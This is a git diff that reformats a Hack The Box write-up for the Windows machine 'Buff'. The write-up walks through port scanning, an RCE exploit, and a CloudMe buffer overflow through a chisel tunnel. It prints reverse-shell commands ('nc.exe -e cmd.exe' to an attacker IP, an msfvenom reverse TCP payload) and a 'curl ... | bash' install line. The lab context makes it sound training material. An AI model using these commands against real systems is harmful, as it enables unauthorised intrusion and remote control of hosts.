@@ -9,14 +9,14 @@ header:
   teaser_home_page: true
   icon: /assets/images/hackthebox.webp
 categories:
-  - hackthebox
-  - windows
+  - Hack the Box
+  - Windows
 tags:  
-  - hackthebox
-  - windows
-  - buffer overflow
-  - rce
-  - chisel
+  - Hack the Box
+  - Windows
+  - Buffer Overflow
+  - RCE
+  - Chisel
 ---
 
 ![](/assets/images/htb-buff/buff_logo.jpg)
@@ -27,7 +27,9 @@ Buff is an easy rated Windows machine from HackTheBox. After our scan, we find t
 ## Port Scan
 We'll start by scanning for open TCP ports using the following nmap command.
 
-```nmap -sCTV -Pn -T4 -p- -oA nmap_all_tcp 10.10.10.198```
+``` bash
+nmap -sCTV -Pn -T4 -p- -oA nmap_all_tcp 10.10.10.198
+```
 
 ![](/assets/images/htb-buff/01_buff_nmap_scan.png)
 
@@ -130,7 +132,9 @@ if __name__ == "__main__":
 
 Now we simply need to run the `gms-exploit.py` script, passing it the site address `http://10.10.10.198:8080/` as the only argument.
 
-```python gms-exploit.py http://10.10.10.198:8080/```
+``` bash
+python gms-exploit.py http://10.10.10.198:8080/
+```
 
 ![](/assets/images/htb-buff/04_buff_user_flag.png)
 
@@ -139,23 +143,31 @@ Success! The exploit results in a shell as the `buff\shaun` user. The shaun user
 ## A Better Shell
 The shell that we are currently working with is not great. We can get a better shell by moving the `nc.exe` executable to the machine. This executbale can be found preinstalled on a Kali image at `/usr/share/windows-binaries/nc.exe`. Copy the executable to your working directory and then run the following command to start the `SMB` server in your directory.
 
-```smbserver.py share . -smb2support```
+``` bash
+smbserver.py share . -smb2support
+```
 
 ![](/assets/images/htb-buff/05_buff_smb_server.png)
 
 Now run the following from our reverse shell sesison to copy nc.exe from our machine to the target over SMB.
 
-```copy \\<YOUR TUNNEL IP>\share\nc.exe C:\xampp\htdocs\gym\upload\nc.exe```
+``` bash
+copy \\<YOUR TUNNEL IP>\share\nc.exe C:\xampp\htdocs\gym\upload\nc.exe
+```
 
 ![](/assets/images/htb-buff/06_buff_copy_nc.png)
 
 Now from our attacking machine, we need to start a Netcat listener. We can start one on port 443 by using the following command.
 
-```nc -lvnp 443```
+``` bash
+nc -lvnp 443
+```
 
 And then from the current reverse shell, run the nc.exe from the uploads directory useing the following command.
 
-```.\nc.exe -e cmd.exe <YOUR TUNNEL IP> 443```
+``` bash
+.\nc.exe -e cmd.exe <YOUR TUNNEL IP> 443
+```
 
 Success! This should result in a much better and interactive reverse shell.
 
@@ -174,7 +186,9 @@ An option would be to copy the CloudMe_1112.exe file to our machine and then run
 
 The only other port that we saw open in our scan was port 7680, and because we are unsure what this is for. It may be that this is the port that the process is running on. However, looking at the exploit script that we found, we can see that it is hardcoded with the value of `8888` as the port. We did not see this port open, but it may be open and only available internally. We should run the following netstat command to list all open ports with something listening.
 
-```netstat -a```
+``` bash
+netstat -a
+```
 
 ![](/assets/images/htb-buff/08_buff_netstat_8888.png)
 
@@ -185,21 +199,29 @@ There are multiple ways that this can be done. The first time that I did this ma
 
 To install on your attacking machine, you will just need to run the following command.
 
-```curl https://i.jpillora.com/chisel! | bash```
+``` bash
+curl https://i.jpillora.com/chisel! | bash
+```
 
 You will also need to download the Windows x64 version of Chisel from [here](https://github.com/jpillora/chisel/releases). Once downloaded, extract and copy the `chisel.exe` file to your working directory. We will use SMB to copy the chisel.exe binary to the target machine. Start the SMB service from your working directory just as we did above when copying the `nc.exe`. Now copy chisel.exe into the uploads directory by running the following command in our reverse shell session.
 
-```copy \\<YOUR TUNNEL IP>\share\chisel.exe C:\xampp\htdocs\gym\upload\chisel.exe```
+``` bash
+copy \\<YOUR TUNNEL IP>\share\chisel.exe C:\xampp\htdocs\gym\upload\chisel.exe
+```
 
 Now from our attacking machine, we will start a chisel reverse tunnel on port 8008 by using the following command.
 
-```chisel server -p 8008 --reverse```
+``` bash
+chisel server -p 8008 --reverse
+```
 
 ![](/assets/images/htb-buff/09_buff_chisel_reverse.png)
 
 Now that we have the server running on our machine, we will send a client connection request from the target machine to our attacking machine on port 8008, offering up port 8888. This can be done with the following command.
 
-```C:\xampp\htdocs\gym\upload\chisel.exe client 10.10.14.16:8008 R:8888:127.0.0.1:8888```
+``` bash
+C:\xampp\htdocs\gym\upload\chisel.exe client 10.10.14.16:8008 R:8888:127.0.0.1:8888
+```
 
 ![](/assets/images/htb-buff/10_buff_chisel_client.png)
 
@@ -208,7 +230,9 @@ Great! We show now have an established tunnel to the CloudMe process from our at
 ## Exploiting the Buffer Overflow Vulnerability
 The [buffer overflow scripts](https://www.exploit-db.com/exploits/48389) that we found will need to have an updated payload. Reading the comment before the payload, we can see that it was generated with `msfvenom` and will simply ask the machine to open the calculator on the machine. As our goal is a shell and not a calculator, we generate our own payload also using msfvenom. We can do this by running the following command.
 
-```msfvenom -p windows/shell_reverse_tcp LHOST=<YOUR TUNNEL IP> LPORT=9001 EXITFUNC=thread -b "\x00\x0A\x0D" -f python```
+``` bash
+msfvenom -p windows/shell_reverse_tcp LHOST=<YOUR TUNNEL IP> LPORT=9001 EXITFUNC=thread -b "\x00\x0A\x0D" -f python
+```
 
 ![](/assets/images/htb-buff/11_buff_msfvenom.png)
 
@@ -272,11 +296,15 @@ Save your script in your working directory, naming it `cm-bo.py`.
 
 We will now need to start a Netcat listener on port 9001 to catch the reverse shell request when we run our script. On your attacking machine start the listener using the following command.
 
-```nc -lvnp 9001```
+``` bash
+nc -lvnp 9001
+```
 
 And now from your working directory, run the script using the following command.
 
-```python cm-bo-py```
+``` bash
+python cm-bo-py
+```
 
 Success! When the script is run, the request is sent locally to our attacking machine, chisel then sends it through our established tunnel and then it is received by the target on port 8888. This results in a successful buffer overflow and the payload it executed, requesting a reverse shell back to our attacking machine on port 9001. We now have access to the local administrator account and the `root.txt`.
 
